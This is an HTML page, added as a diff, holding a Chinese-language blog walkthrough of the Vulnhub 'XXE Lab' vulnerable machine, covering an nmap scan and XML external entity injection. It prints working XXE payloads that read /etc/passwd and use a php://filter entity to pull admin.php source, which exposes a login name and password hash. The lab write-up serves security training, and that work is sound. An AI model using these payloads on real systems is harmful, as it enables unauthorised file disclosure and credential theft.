@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="CBear.Blog">
+  <link 
+    rel="icon" 
+    href="/img/logo.png">
+  <title>Vulnhub|XXE Lab</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="Vulnhub|XXE Lab">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://cbeartalk.top/55575d9b.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+      <meta 
+        property="og:img" 
+        content="难度：⭐⭐">
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2022-04-20">
+      <meta 
+        property="og:article:modified_time" 
+        content="2022-04-20">
+      <meta 
+        property="og:article:author" 
+        content="CBear">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="Vulnhub">
+        
+          <meta 
+            property="og:article:tag" 
+            content="劫持环境变量提权">
+        
+          <meta 
+            property="og:article:tag" 
+            content="FileUpload">
+        
+          <meta 
+            property="og:article:tag" 
+            content="XXE">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+      
+      
+      
+      
+        
+        
+        
+        <script>
+          function prismThemeChange() {
+            if(document.getElementById('theme-color').dataset.mode === 'dark') {
+              if(document.querySelector('[data-prism]')) {
+                changeCSS('/js/lib/prism/prism-tomorrow.min.css', '[data-prism]', 'prism-tomorrow');
+              } else {
+                loadCSS('/js/lib/prism/prism-tomorrow.min.css', 'prism', 'prism-tomorrow');
+              }
+            } else {
+              if(document.querySelector('[data-prism]')) {
+                changeCSS('/js/lib/prism/prism.min.css', '[data-prism]', 'prism');
+              } else {
+                loadCSS('/js/lib/prism/prism.min.css', 'prism', 'prism');
+              }
+            }
+          }
+          prismThemeChange()
+        </script>
+      
+      
+        
+        <link rel="stylesheet" href="/js/lib/prism/prism-line-numbers.min.css">
+      
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+        prismThemeChange();
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+        prismThemeChange();
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+        prismThemeChange();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img"
+          width="32"
+          height="32"
+          src="/img/logo.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">CBear.Blog</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          Home
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          Archive
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          Tags
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          Categories
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          About
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          Friends
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      Vulnhub|XXE Lab
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-04-20T02:04:46.671Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2022-04-20</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" 
+          class="post-meta-link">
+          渗透测试
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>921 words</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/Vulnhub/" 
+            class="post-meta-link">
+            Vulnhub
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/" 
+            class="post-meta-link">
+            劫持环境变量提权
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/FileUpload/" 
+            class="post-meta-link">
+            FileUpload
+          </a>
+        
+          
+            <span class="dot"></span>
+          
+          <a 
+            href="/tags/XXE/" 
+            class="post-meta-link">
+            XXE
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h2 id="0-_u9776_u673A_u5B89_u88C5"><a href="#0-_u9776_u673A_u5B89_u88C5" class="headerlink" title="0.靶机安装"></a>0.靶机安装</h2><blockquote>
+<p>不再赘述，可看之前的<strong>Vulnhub</strong>相关文章。  </p>
+</blockquote>
+<h2 id="1-_u4FE1_u606F_u6536_u96C6"><a href="#1-_u4FE1_u606F_u6536_u96C6" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><blockquote>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/var/logs<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap -A -p- 192.168.81.129        </span>
+Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-04-19 <span class="token number">21</span>:07 CDT
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.129
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00052s latency<span class="token punctuation">)</span>.                                                                                    
+Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>                                                                         
+PORT     STATE SERVICE VERSION                                                                                    
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.27 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>                                                             
+<span class="token operator">|</span> http-robots.txt: <span class="token number">2</span> disallowed entries                                                                           
+<span class="token operator">|</span>_/xxe/* /admin.php                                                                                               
+<span class="token operator">|</span>_http-title: Apache2 Ubuntu Default Page: It works                                                               
+<span class="token operator">|</span>_http-server-header: Apache/2.4.27 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>                                                                      
+<span class="token number">5355</span>/tcp <span class="token function">open</span>  llmnr?                                                                                             
+MAC Address: 00:0C:29:55:D1:56 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>                                                                           
+Device type: general purpose                                                                                      
+Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X                                                                                            
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4                                                   
+OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>                                                                                       
+Network Distance: <span class="token number">1</span> hop                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>robots.txt记录了两个路径：<code>/xxe/</code>和<code>/admin.php</code>。<br>访问<code>/admin.php</code>，响应404。<br>访问<code>/xxe/</code>，是一个登陆界面，用admin:admin登录，查看请求，POST报文是<strong>XML</strong>代码：<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /xxe/xxe.php HTTP/1.1
+Host: 192.168.81.129
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 95
+Origin: http://192.168.81.129
+DNT: 1
+Connection: close
+Referer: http://192.168.81.129/xxe/
+
+<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>尝试进行<code>XXE</code>，注意此处请求报文<strong><name></strong>标记中参数前要加上一个<strong>&amp;</strong>：<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">POST /xxe/xxe.php HTTP/1.1
+Host: 192.168.81.129
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 189
+Origin: http://192.168.81.129
+DNT: 1
+Connection: close
+Referer: http://192.168.81.129/xxe/
+
+<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">r</span> <span class="token punctuation">[</span><span class="token internal-subset">
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">r</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>
+
+&lt;!ENTITY admin SYSTEM "file:///etc/passwd">
+
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&admin;">&amp;admin;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看响应体，注入成功：<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">Sorry, this root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+_apt:x:106:65534::/nonexistent:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+r00t:x:1000:1000:Administrator,,,:/home/r00t:/bin/bash
+not available!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>尝试读取<code>/admin.php</code>的内容：  </p>
+<ul>
+<li><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">r</span> <span class="token punctuation">[</span><span class="token internal-subset">
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">r</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>
+
+&lt;!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
+
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&admin;">&amp;admin;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+查看响应报文，得到base64形式的php内容，进行解码：  <pre class="line-numbers language-html" data-language="html"><code class="language-html">//实际报文：
+Sorry, this PD9waHAKICAgc2Vzc2lvbl9zdGFydCgpOwo/PgoKCjxodG1sIGxhbmcgPSAiZW4iPgogICAKICAgPGhlYWQ+CiAgICAgIDx0aXRsZT5hZG1pbjwvdGl0bGU+CiAgICAgIDxsaW5rIGhyZWYgPSAiY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiByZWwgPSAic3R5bGVzaGVldCI+CiAgICAgIAogICAgICA8c3R5bGU+CiAgICAgICAgIGJvZHkgewogICAgICAgICAgICBwYWRkaW5nLXRvcDogNDBweDsKICAgICAgICAgICAgcGFkZGluZy1ib3R0b206IDQwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNBREFCQUI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiB7CiAgICAgICAgICAgIG1heC13aWR0aDogMzMwcHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5mb3JtLXNpZ25pbi1oZWFkaW5nLAogICAgICAgICAuZm9ybS1zaWduaW4gLmNoZWNrYm94IHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5jaGVja2JveCB7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sIHsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgIC13ZWJraXQtYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgLW1vei1ib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sOmZvY3VzIHsKICAgICAgICAgICAgei1pbmRleDogMjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIGlucHV0W3R5cGU9ImVtYWlsIl0gewogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAtMXB4OwogICAgICAgICAgICBib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiMwMTc1NzI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiBpbnB1dFt0eXBlPSJwYXNzd29yZCJdIHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1yaWdodC1yYWRpdXM6IDA7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjojMDE3NTcyOwogICAgICAgICB9CiAgICAgICAgIAogICAgICAgICBoMnsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICA8L3N0eWxlPgogICAgICAKICAgPC9oZWFkPgoJCiAgIDxib2R5PgogICAgICAKICAgICAgPGgyPkVudGVyIFVzZXJuYW1lIGFuZCBQYXNzd29yZDwvaDI+IAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciBmb3JtLXNpZ25pbiI+CiAgICAgICAgIAogICAgICAgICA8P3BocAogICAgICAgICAgICAkbXNnID0gJyc7CiAgICAgICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ2xvZ2luJ10pICYmICFlbXB0eSgkX1BPU1RbJ3VzZXJuYW1lJ10pIAogICAgICAgICAgICAgICAmJiAhZW1wdHkoJF9QT1NUWydwYXNzd29yZCddKSkgewoJCQkJCiAgICAgICAgICAgICAgIGlmICgkX1BPU1RbJ3VzZXJuYW1lJ10gPT0gJ2FkbWluaXN0aGViZXN0JyAmJiAKICAgICAgICAgICAgICAgICAgbWQ1KCRfUE9TVFsncGFzc3dvcmQnXSkgPT0gJ2U2ZTA2MTgzODg1NmJmNDdlMWRlNzMwNzE5ZmIyNjA5JykgewogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3ZhbGlkJ10gPSB0cnVlOwogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3RpbWVvdXQnXSA9IHRpbWUoKTsKICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VybmFtZSddID0gJ2FkbWluaXN0aGViZXN0JzsKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlY2hvICJZb3UgaGF2ZSBlbnRlcmVkIHZhbGlkIHVzZSBuYW1lIGFuZCBwYXNzd29yZCA8YnIgLz4iOwoJCSRmbGFnID0gIkhlcmUgaXMgdGhlIDxhIHN0eWxlPSdjb2xvcjpGRjAwMDA7JyBocmVmPScvZmxhZ21lb3V0LnBocCc+RmxhZzwvYT4iOwoJCWVjaG8gJGZsYWc7CiAgICAgICAgICAgICAgIH1lbHNlIHsKICAgICAgICAgICAgICAgICAgJG1zZyA9ICdNYXliZSBMYXRlcic7CiAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICA/PgogICAgICA8L2Rpdj4gPCEtLSBXMDB0L1cwMHQgLS0+CiAgICAgIAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciI+CiAgICAgIAogICAgICAgICA8Zm9ybSBjbGFzcyA9ICJmb3JtLXNpZ25pbiIgcm9sZSA9ICJmb3JtIiAKICAgICAgICAgICAgYWN0aW9uID0gIjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7IAogICAgICAgICAgICA/PiIgbWV0aG9kID0gInBvc3QiPgogICAgICAgICAgICA8aDQgY2xhc3MgPSAiZm9ybS1zaWduaW4taGVhZGluZyI+PD9waHAgZWNobyAkbXNnOyA/PjwvaDQ+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlID0gInRleHQiIGNsYXNzID0gImZvcm0tY29udHJvbCIgCiAgICAgICAgICAgICAgIG5hbWUgPSAidXNlcm5hbWUiIAogICAgICAgICAgICAgICByZXF1aXJlZCBhdXRvZm9jdXM+PC9icj4KICAgICAgICAgICAgPGlucHV0IHR5cGUgPSAicGFzc3dvcmQiIGNsYXNzID0gImZvcm0tY29udHJvbCIKICAgICAgICAgICAgICAgbmFtZSA9ICJwYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3MgPSAiYnRuIGJ0bi1sZyBidG4tcHJpbWFyeSBidG4tYmxvY2siIHR5cGUgPSAic3VibWl0IiAKICAgICAgICAgICAgICAgbmFtZSA9ICJsb2dpbiI+TG9naW48L2J1dHRvbj4KICAgICAgICAgPC9mb3JtPgoJCQkKICAgICAgICAgQ2xpY2sgaGVyZSB0byBjbGVhbiA8YSBocmVmID0gImFkbWlubG9nLnBocCIgdGl0ZSA9ICJMb2dvdXQiPlNlc3Npb24uCiAgICAgICAgIAogICAgICA8L2Rpdj4gCiAgICAgIAogICA8L2JvZHk+CjwvaHRtbD4K not available!
+//解码后，找到关键信息：
+<span class="token prolog">&lt;?php
+......
+              if ($_POST['username'] == 'administhebest' &amp;&amp; 
+                 md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') &#123;
+                 $_SESSION['valid'] = true;
+                 $_SESSION['timeout'] = time();
+                 $_SESSION['username'] = 'administhebest';
+                 
+               echo "You have entered valid use name and password &lt;br />";
+	$flag = "Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'>Flag&lt;/a>";
+	echo $flag;
+              &#125;else &#123;
+                 $msg = 'Maybe Later';
+              &#125;
+           &#125;
+        ?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+</blockquote>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            CBear
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://cbeartalk.top/55575d9b.html">
+            https://cbeartalk.top/55575d9b.html
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span><a target="_blank" rel="noopener">转载请注明出处！</a></p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/7293a273.html" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">Next</div>
+          
+            <div class="nav-title">Vulhub|Zabbix集合 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-_u9776_u673A_u5B89_u88C5"><span class="toc-text">0.靶机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-_u4FE1_u606F_u6536_u96C6"><span class="toc-text">1.信息收集</span></a></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img"
+    width="88"
+    height="88"
+    alt="author avatar">
+
+<p class="author-name">CBear</p>
+<p class="author-description">Stay sharp, stay alone.</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>35</span>
+    <span>Posts</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>5</span>
+    <span>Categories</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>41</span>
+    <span>Tags</span>
+  </a>
+</div>
+
+  <div class="author-card-society">
+    
+      <div class="author-card-society-icon">
+        <a target="_blank" rel="noopener" href="https://github.com/chen-299">
+          <i class="iconfont icon-github society-icon"></i>
+        </a>
+      </div>
+    
+      <div class="author-card-society-icon">
+        <a href="mailto:13530567672@163.com">
